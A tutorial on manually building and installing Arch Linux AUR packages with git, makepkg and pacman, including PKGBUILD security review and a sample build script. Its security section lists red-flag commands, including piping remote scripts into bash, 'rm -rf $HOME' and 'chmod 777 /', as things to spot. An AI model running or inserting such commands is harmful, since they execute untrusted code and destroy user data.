## Manual AUR Package Building


### Overview

Building AUR packages manually without helpers provides complete control over the build process, ensures you understand what's being installed, and is essential for security-conscious users or when AUR helpers fail. This is the traditional, recommended method by Arch Linux developers.

### Prerequisites

#### Essential Tools

**Install base-devel:**
```
sudo pacman -S base-devel
```

**base-devel includes:**
- gcc (compiler)
- make
- automake
- autoconf
- binutils
- fakeroot
- pkg-config
- Other build essentials

**Install git:**
```
sudo pacman -S git
```

Needed for cloning AUR repositories.

#### Understanding the Build Process

**Manual build workflow:**
1. Find package on AUR website
2. Clone package repository
3. Review PKGBUILD and files
4. Build package with makepkg
5. Install with pacman

### Finding AUR Packages

#### AUR Website

**Browse AUR:**
```
https://aur.archlinux.org/
```

**Search for packages:**
- Use search box at top
- Filter by name, description, maintainer
- View package details, votes, popularity

**Package page shows:**
- PKGBUILD link
- Git clone URL
- Dependencies
- Comments
- Package votes and popularity
- Maintainer information
- Last updated date

### Downloading Package Files

#### Clone AUR Repository

**Using git (recommended):**
```
git clone https://aur.archlinux.org/package-name.git
cd package-name
```

**Alternative - download snapshot:**
```
wget https://aur.archlinux.org/cgit/aur.git/snapshot/package-name.tar.gz
tar -xzf package-name.tar.gz
cd package-name
```

#### Repository Contents

**Typical AUR package structure:**
```
package-name/
├── .SRCINFO          # Package metadata
├── PKGBUILD          # Build instructions
├── .gitignore        # Git ignore file
└── additional files  # Patches, configs, etc.
```

### Reviewing PKGBUILD

#### What is a PKGBUILD?

**Bash script containing:**
- Package metadata (name, version, description)
- Source file URLs
- Dependencies
- Build instructions (functions)
- Installation instructions

#### Essential PKGBUILD Components

**Meta**
```bash
pkgname=package-name
pkgver=1.0.0
pkgrel=1
pkgdesc="Package description"
arch=('x86_64')
url="https://project.homepage.com"
license=('GPL')
```

**Dependencies:**
```bash
depends=('dependency1' 'dependency2')
makedepends=('build-tool1' 'build-tool2')
optdepends=('optional-dep: for feature')
```

**Sources:**
```bash
source=("https://example.com/source-$pkgver.tar.gz"
        "local-patch.patch")
sha256sums=('abc123...'
            'def456...')
```

**Build functions:**
```bash
prepare() {
    # Prepare source (apply patches, etc.)
}

build() {
    # Compile the software
}

package() {
    # Install to package directory
}
```

#### Security Review

**Check source URLs:**
```bash
source=("https://github.com/project/archive/$pkgver.tar.gz")
```

Verify URLs point to official project repositories.

**Look for suspicious commands:**
```bash
# Red flags:
curl http://untrusted.com/script | bash
wget -qO- http://site.com | sh
rm -rf $HOME
chmod 777 /
```

**Verify checksums:**
```bash
sha256sums=('abc123...')
```

Checksums prevent tampered downloads.

**Review build commands:**
```bash
build() {
    ./configure --prefix=/usr
    make
}
```

Standard build commands are safe.

**Check install commands:**
```bash
package() {
    cd "$srcdir/$pkgname-$pkgver"
    make DESTDIR="$pkgdir" install
}
```

Should only install to `$pkgdir`, not system directly.

#### Reading the PKGBUILD

**View entire file:**
```
cat PKGBUILD
less PKGBUILD
```

**Check specific sections:**
```
grep "^source=" PKGBUILD
grep "^depends=" PKGBUILD
```

**Syntax highlighting:**
```
vim PKGBUILD
nano PKGBUILD
```

### Building the Package

#### Basic Build Command

**Build with dependency installation:**
```
makepkg -s
```

The `-s` flag automatically installs missing dependencies.

**Common makepkg flags:**
```
-s, --syncdeps     Install missing dependencies
-i, --install      Install package after building
-c, --clean        Clean up work files after build
-r, --rmdeps       Remove build dependencies after build
-f, --force        Overwrite existing package
```

#### Complete Build and Install

**Build, install, and cleanup:**
```
makepkg -si
```

**Most comprehensive:**
```
makepkg -sri
```

Flags:
- `-s` - Install dependencies
- `-r` - Remove build deps after
- `-i` - Install built package

#### Build Process Steps

**What makepkg does:**

**1. Preparation:**
- Downloads source files
- Verifies checksums
- Extracts archives

**2. Build:**
- Runs prepare() function
- Runs build() function
- Compiles software

**3. Package:**
- Runs package() function
- Creates package tarball
- Generates .SRCINFO

**4. Installation (with -i):**
- Calls pacman to install
- Registers in database

#### Output Location

**Default:**
```
./package-name-version-arch.pkg.tar.zst
```

Package created in current directory.

**Custom location:**
Set in `~/.makepkg.conf`:
```
PKGDEST=~/packages
```

### Handling Dependencies

#### Installing Dependencies

**Automatic with -s flag:**
```
makepkg -s
```

Installs dependencies from official repos.

**Manual installation:**
```
# Check dependencies
grep "depends=" PKGBUILD
grep "makedepends=" PKGBUILD

# Install manually
sudo pacman -S dependency1 dependency2
```

#### AUR Dependencies

**If dependency is also in AUR:**

```
# Build dependency first
git clone https://aur.archlinux.org/aur-dependency.git
cd aur-dependency
makepkg -si

# Return to main package
cd ../package-name
makepkg -si
```

**Dependency chain:**
Build and install AUR dependencies in correct order.

### Installing the Built Package

#### Using Pacman

**Install from package file:**
```
sudo pacman -U package-name-version-arch.pkg.tar.zst
```

**Or if makepkg succeeded:**
```
makepkg -i
```

Automatically installs after building.

#### Installation Options

**Install as dependency:**
```
sudo pacman -U --asdeps package.pkg.tar.zst
```

Marks package as dependency, not explicitly installed.

**Reinstall/upgrade:**
```
sudo pacman -U package.pkg.tar.zst
```

Works for both new installation and upgrades.

### Updating AUR Packages

#### Check for Updates

**Navigate to package directory:**
```
cd ~/aur/package-name
```

**Pull latest changes:**
```
git pull
```

**Check what changed:**
```
git log
git diff HEAD@{1}
```

#### Rebuild and Update

**Standard update process:**
```
cd ~/aur/package-name
git pull
cat PKGBUILD  # Review changes
makepkg -si
```

**Clean rebuild:**
```
makepkg -Ccsi
```

Flags:
- `-C` - Clean previous build artifacts
- `-c` - Clean after build
- `-s` - Install dependencies
- `-i` - Install package

### Customizing PKGBUILDs

#### When to Modify

**Valid reasons:**
- Adding custom patches
- Changing compile flags
- Adjusting installation paths
- Enabling/disabling features

**Example modification:**
```bash
# Original PKGBUILD
./configure --prefix=/usr

# Modified for custom features
./configure --prefix=/usr --enable-feature --disable-other
```

#### Making Local Changes

**Edit PKGBUILD:**
```
nano PKGBUILD
```

**Common customizations:**

**Add custom patches:**
```bash
source+=("my-patch.patch")
sha256sums+=('abc123...')

prepare() {
    patch -p1 < "$srcdir/my-patch.patch"
}
```

**Change compile options:**
```bash
build() {
    CFLAGS="-O3 -march=native" ./configure --prefix=/usr
    make
}
```

**Skip tests:**
```bash
# Comment out check() function
# check() {
#     make test
# }
```

#### Generating Updated Checksums

**After modifying sources:**
```
updpkgsums
```

Or:
```
makepkg -g >> PKGBUILD
```

Updates checksums in PKGBUILD.

### Working with Different Package Types

#### Binary Packages (-bin)

**Pre-compiled software:**
```bash
# PKGBUILD typically downloads binary
source=("https://example.com/program-$pkgver-linux-x64.tar.gz")

package() {
    # Just copy files, no compilation
    install -Dm755 program "$pkgdir/usr/bin/program"
}
```

**Build is faster:** No compilation step.

#### Development Packages (-git)

**Build from latest source:**
```bash
pkgver() {
    cd "$srcdir/$pkgname"
    git describe --long --tags | sed 's/^v//;s/-/.r/;s/-/./g'
}

source=("git+https://github.com/project/repo.git")
```

**Always latest:** Version updates on each build.

**Rebuild to update:**
```
makepkg -Ccsi
```

### Build Directory Management

#### Build Locations

**Working directory:**
```
src/         # Extracted sources
pkg/         # Packaged files
```

**Clean build artifacts:**
```
makepkg -c   # After successful build
makepkg -C   # Before building
```

#### Cache Management

**makepkg downloads to:**
```
~/.cache/makepkg/
```

Or custom:
```
# ~/.makepkg.conf
SRCDEST=~/makepkg/sources
```

**Clean old sources:**
```
rm -rf ~/.cache/makepkg/
```

### Troubleshooting Build Issues

#### Checksum Failures

**Error:**
```
==> Verifying source file signatures with gpg...
    source.tar.gz ... FAILED (invalid PGP signature)
```

**Solutions:**

**Import missing key:**
```
gpg --recv-keys KEY_ID
```

**Skip verification (insecure):**
```
makepkg --skippgpcheck
```

**Update checksums:**
```
updpkgsums
```

#### Compilation Errors

**Missing dependencies:**
```
configure: error: Package 'libfoo' not found
```

**Solution:**
```
sudo pacman -S libfoo
makepkg -s
```

**C++ compiler issues:**
```
# Add to PKGBUILD
makedepends+=('gcc')
```

#### Space Issues

**Insufficient disk space:**
```
error: failed to extract source
```

**Check available space:**
```
df -h .
```

**Clean and retry:**
```
makepkg -C
df -h .
makepkg -s
```

### Best Practices

#### Organization

**Dedicated AUR directory:**
```
mkdir -p ~/aur
cd ~/aur
git clone https://aur.archlinux.org/package.git
```

**Track packages:**
```
ls ~/aur/
```

Shows all AUR packages you've built.

#### Security

**Always review PKGBUILDs:** Never build without reading the PKGBUILD first.

**Check AUR comments:** Read package comments for known issues or security concerns.

**Verify sources:** Ensure source URLs are legitimate project repositories.

**Import keys properly:** Verify PGP keys before importing.

**Use checksums:** Don't skip checksum verification.

#### Maintenance

**Update regularly:**
```
cd ~/aur/package-name
git pull
makepkg -si
```

**Clean old versions:**
```
rm package-name-old-version.pkg.tar.zst
```

**Document modifications:** Keep notes on PKGBUILD changes you made.

### Automation Script

#### Build Script Example

```bash
#!/bin/bash
# Build AUR package with safety checks

PACKAGE="$1"

if [ -z "$PACKAGE" ]; then
    echo "Usage: $0 package-name"
    exit 1
fi

# Create AUR directory if needed
mkdir -p ~/aur
cd ~/aur

# Clone or update
if [ -d "$PACKAGE" ]; then
    echo "Updating $PACKAGE..."
    cd "$PACKAGE"
    git pull
else
    echo "Cloning $PACKAGE..."
    git clone "https://aur.archlinux.org/${PACKAGE}.git"
    cd "$PACKAGE"
fi

# Review PKGBUILD
echo "=== PKGBUILD Review ==="
cat PKGBUILD
echo "===================="
read -p "Proceed with build? (y/n): " ANSWER

if [ "$ANSWER" != "y" ]; then
    echo "Build cancelled"
    exit 0
fi

# Build and install
makepkg -si

echo "Build complete!"
```

**Usage:**
```
chmod +x build-aur.sh
./build-aur.sh package-name
```

Manual AUR package building provides complete transparency and control over what software is installed on your system, making it the most secure method for using community packages while maintaining Arch Linux principles of user control and simplicity.

